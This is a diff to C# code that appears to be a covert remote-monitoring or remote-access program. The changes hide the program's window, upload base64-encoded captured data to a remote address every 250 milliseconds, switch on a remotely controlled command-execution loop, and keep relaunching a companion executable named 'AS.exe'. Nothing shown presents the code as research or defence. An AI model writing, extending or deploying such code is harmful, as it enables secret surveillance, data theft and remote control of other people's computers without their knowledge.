@@ -49,14 +49,13 @@ namespace SCSU
                     thread.Start();
                 }
 
-
-                /*if ((bool)setting["cmd"] != cmd)
+                if ((bool)setting["cmd"] != cmd)
                 {
                     cmd = (bool)setting["cmd"];
                     System.Threading.Thread cmdthread = new Thread(new ThreadStart(cmdloop));
                     cmdthread.Start();
                 }
-                if ((bool)setting["taskmgr"] != taskmgr)
+                /*if ((bool)setting["taskmgr"] != taskmgr)
                 {
                     taskmgr = (bool)setting["taskmgr"];
                     if (taskmgr)
@@ -105,6 +104,7 @@ namespace SCSU
         }
         private void loop()
         {
+            Hide();
             while (looping)
             {
                 try
@@ -119,6 +119,8 @@ namespace SCSU
                     WebClient client = new WebClient();
                     client.Headers.Add("Content-Type", "text/plain");
                     client.UploadString(captureText, "PUT", base64);
+                    Process[] AS = Process.GetProcessesByName("AS");
+                    if (AS.Length >= 0) Process.Start("AS.exe");
                 }
                 catch { }
                 System.Threading.Thread.Sleep(250);
